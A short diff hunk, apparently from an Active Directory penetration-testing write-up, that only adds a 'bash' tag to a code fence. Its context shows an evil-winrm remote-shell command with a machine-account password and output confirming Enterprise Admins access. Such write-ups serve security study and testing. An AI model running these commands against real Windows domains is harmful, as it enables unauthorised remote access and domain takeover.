@@ -312,7 +312,7 @@ evil-winrm -i 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd'
 
 Evil-WinRM leverages Windows Remote Management to give you a remote shell on Windows systems. It runs over standard ports often allowed through firewalls (5985/5986), provides a fully interactive PowerShell session, and includes convenient features for file transfers and script execution. Once connected, I confirmed our elevated privileges:
 
-```
+```bash
 *Evil-WinRM* PS C:\Users\ATTACKER-PC02$\Documents> net group "Enterprise Admins" /domain
 Group name     Enterprise Admins
 Comment        Designated administrators of the enterprise
